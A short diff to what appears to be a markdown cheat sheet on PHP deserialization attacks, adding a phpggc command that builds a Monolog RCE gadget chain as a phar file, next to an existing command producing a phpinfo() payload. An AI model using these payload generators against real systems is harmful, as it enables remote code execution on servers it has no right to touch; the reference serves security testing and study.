@@ -133,6 +133,7 @@ Also called `"PHP POP Chains"`, they can be used to gain RCE on the system.
 
 ```powershell
 phpggc monolog/rce1 'phpinfo();' -s
+phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
 ```
 
 ## PHP Phar Deserialization
